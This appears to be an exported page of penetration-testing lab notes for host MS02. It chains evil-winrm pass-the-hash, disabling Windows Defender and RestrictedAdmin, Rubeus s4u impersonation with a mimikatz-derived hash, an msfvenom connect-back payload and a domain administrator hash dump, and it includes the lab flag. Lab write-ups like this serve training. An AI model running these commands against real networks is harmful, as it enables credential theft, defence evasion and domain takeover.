<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>MS02 - 172.16.4.31</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>MS02 - 172.16.4.31</h1><br/><p><a href="Offshore--MS02_-_172.16.4.31_25.html#OFS-Flag31">Flag 31</a></p><p><a href="Offshore--MS02_-_172.16.4.31_25.html#OFS-Client-DomainAdminHash">Client domain admin hash</a></p><p></p><p>Evil-WinRM to set our login with hash registry key and turn off Windows Defender</p><p></p><p><code><span style="background-color:#000000;">└─$ evil-winrm -i 172.16.4.31 -u svc_client_sec$ -H &#39;b23930001d1bfeed9ad9e1b8f34909c1&#39;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Evil-WinRM shell v3.4</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Info: Establishing connection to remote endpoint</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">*Evil-WinRM* PS C:\Users\svc_client_sec$\Documents&gt; reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">The operation completed successfully.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">*Evil-WinRM* PS C:\Users\svc_client_sec$\Documents&gt; Set-MpPreference -DisableRealtimeMonitoring $true</span></code></p><p></p><p></p><p>Grab the flag on the administrator&#39;s desktop</p><p><a name="OFS-Flag31"></a><code><span style="background-color:#000000;">OFFSHORE{th3_fin@l_h0p}</span></code></p><p></p><p>MS02</p><p></p><p><img src="images/25-1.png" alt="images/25-1.png" /></p><p></p><p>This means MS02 can impersonate any user on DC04.  </p><p></p><p>Use this command to run powershell as MS02$</p><p><code><span style="background-color:#000000;">runas /netonly /user:client\MS02$ &quot;powershell -ep bypass&quot;</span></code></p><p>(just hit enter when it asks you for a PW, we&#39;re using the hash in Rubeus instead)</p><p></p><p>Make sure it worked</p><p><img src="images/25-2.png" alt="images/25-2.png" /></p><p></p><p>Use Rubeus with s4u to do the full impersonation.</p><p></p><p>(hash is MS02&#39;s hash gotten with mimikatz - privilege::debug, sekurlsa::logonpasswords /all)</p><p></p><p><code><span style="background-color:#000000;">.\Rubeus.exe s4u /user:MS02$ /rc4:dc7a49c0c36399ae87f3de623ebab985 /impersonateuser:administrator /msdsspn:&quot;cifs/dc04.client.offshore.com&quot; /altservice:cifs,host /ptt</span></code></p><p></p><p><img src="images/25-3.png" alt="images/25-3.png" /></p><p></p><p>Make a msfvenom payload and upload it to DC04</p><p></p><p>Connect back and do a hash dump</p><p></p><p><img src="images/25-4.png" alt="images/25-4.png" /></p><p></p><p><a name="OFS-Client-DomainAdminHash"></a>Administrator:500:aad3b435b51404eeaad3b435b51404ee:a569f80ccd9fda0ea5e749d20aa80657:::</p><p></p><p><img src="images/25-5.png" alt="images/25-5.png" /></p></div>
</body>
</html>
